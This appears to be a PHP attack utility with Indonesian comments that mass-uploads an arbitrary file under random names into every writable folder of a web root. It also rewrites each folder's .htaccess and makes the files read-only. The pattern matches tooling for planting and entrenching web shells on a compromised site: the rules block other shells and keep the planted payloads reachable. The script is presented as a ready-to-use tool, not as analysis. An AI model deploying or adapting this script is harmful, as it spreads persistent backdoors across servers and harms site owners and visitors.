<?php
error_reporting(0);
set_time_limit(0);

// File log hasil (hanya untuk file upload)
$logFile = __DIR__ . '/hasil.txt';
file_put_contents($logFile, ""); // kosongkan file log setiap upload

// Fungsi generate nama file random
function randomFileName($length = 12, $ext = '') {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $name = '';
    for ($i = 0; $i < $length; $i++) {
        $name .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $name . $ext;
}

// Fungsi ambil semua folder recursive
function getAllFolders($root) {
    $folders = [];
    if (!is_dir($root)) return $folders;

    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iterator as $item) {
        if ($item->isDir()) $folders[] = $item->getPathname();
    }
    $folders[] = $root; // sertakan root
    return $folders;
}

// Konten .htaccess
$htaccessContent = <<<HT
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.sh*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.AS*>
    Order Deny,Allow
    Deny from all
</Files>
<Files "*.php">
    Allow from all
</Files>
<Files "*.php">
    Require all granted
</Files>
<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>

Options -Indexes
HT;

$message = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && isset($_POST['root_path'])) {
    $rootPath = trim($_POST['root_path']);
    if (!is_dir($rootPath)) {
        $message = "Folder root tidak ditemukan: $rootPath";
    } else {
        $tmpFile = $_FILES['file']['tmp_name']; // file sementara
        $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
        $allFolders = getAllFolders($rootPath);

        foreach ($allFolders as $folder) {
            if (!is_dir($folder)) mkdir($folder, 0777, true);

            if (is_writable($folder)) {
                // Upload file
                $targetFile = rtrim($folder, '/') . '/' . randomFileName(12, '.' . $ext);
                if (@copy($tmpFile, $targetFile)) {
                    echo "File berhasil dicopy ke $folder sebagai $targetFile<br>";

                    // Hanya log file upload ke hasil.txt
                    file_put_contents($logFile, "$folder sebagai $targetFile" . PHP_EOL, FILE_APPEND);

                    @chmod($targetFile, 0444);
                } else {
                    echo "Gagal copy file ke $folder<br>";
                }

                // Buat/Update .htaccess, tapi tidak dicatat di hasil.txt
                $htFile = rtrim($folder, '/') . '/.htaccess';
                @file_put_contents($htFile, $htaccessContent);
                @chmod($htFile, 0444);

            } else {
                echo "Folder tidak writable: $folder<br>";
            }
        }
    }
}
?>

<h3>Mass Upload + .htaccess + chmod 0444 (log file upload saja)</h3>
<form method="post" enctype="multipart/form-data">
    Path root: <input type="text" name="root_path" style="width:600px" required><br><br>
    Pilih file: <input type="file" name="file" required><br><br>
    <input type="submit" value="GASKAN >>>">
</form>
<?php if($message) echo "<p style='color:red'>$message</p>"; ?>
